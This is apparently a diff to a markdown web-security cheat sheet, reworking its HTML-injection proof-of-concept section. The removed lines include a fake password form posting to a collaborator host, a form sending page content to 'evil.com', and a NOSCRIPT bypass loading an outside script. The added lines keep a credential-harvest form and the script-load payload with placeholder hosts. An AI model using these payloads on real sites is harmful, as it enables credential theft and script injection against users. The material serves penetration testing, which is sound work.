@@ -5056,6 +5056,7 @@ Got injection in a PDF, try reading local files with:
 </div>
 </dd>
 </dl>
+```
 
 </details>
 
@@ -6935,25 +6936,21 @@ to demonstrate XSS impact, don't use alert('alert'). Determine whether session i
 <details>
 <summary>HTML injection (POC creation)</summary>
 
-<dl>
-<dd>
+1. Form-based POC:
 
-1. <form action="@collaberator.burpcollaborator.net">Password:<br><input name="p"><br><input type="submit" value="Join meet"></form><!--
+```html
+<form action="YOUR-COLLABORATOR-DOMAIN">
+  Password:<br>
+  <input name="p"><br>
+  <input type="submit" value="Join meet">
+</form>
+```
 
-2. "><NOSCRIPT><p title="</NOSCRIPT><script src=https://xxxx.xss(.)ht></script>">
+2. HTML injection payload:
 
-3. <h1>!!</h1><br/><h2><p style=\"color:red;\">there is a new discount code of 80%. Take advantage of it now!</p><form action=\"https://url/\\"><button type=\"submit\">Click Here</button></h2>
-
-4. For create layer mask:
-
-`...`
-
-5. For obtain content page, email:
-
-`<form action='//evil.com'><button type='submit'><textarea name='x'>...`
-
-</dd>
-</dl>
+```html
+"><NOSCRIPT><p title="</NOSCRIPT><script src=YOUR-TEST-URL></script>">
+```
 
 </details>
 
